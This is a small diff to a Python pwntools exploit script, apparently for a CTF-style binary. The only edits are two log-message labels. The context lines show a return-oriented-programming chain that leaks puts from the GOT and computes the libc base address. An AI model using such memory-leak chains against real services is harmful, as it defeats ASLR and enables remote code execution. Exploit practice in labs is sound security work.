@@ -29,7 +29,7 @@ def start():
 
 p = start()
 
-log.info(f"PUTS GOT {hex(elf.got.puts)}")
+log.info(f"PUTS@GOT {hex(elf.got.puts)}")
 
 padding = b"GET "
 padding += b"aaa\x00"
@@ -44,7 +44,7 @@ log.info(rop.dump())
 p.sendline(rop.chain())
 
 PUTS = unpack(p.recvlines(4)[-1], 'all')
-log.info(f"PUTS: {hex(PUTS)}")
+log.info(f"PUTS@LIBC: {hex(PUTS)}")
 
 libc.address = PUTS - libc.sym['puts']
 log.info(f"LIBC base: {hex(libc.address)}")
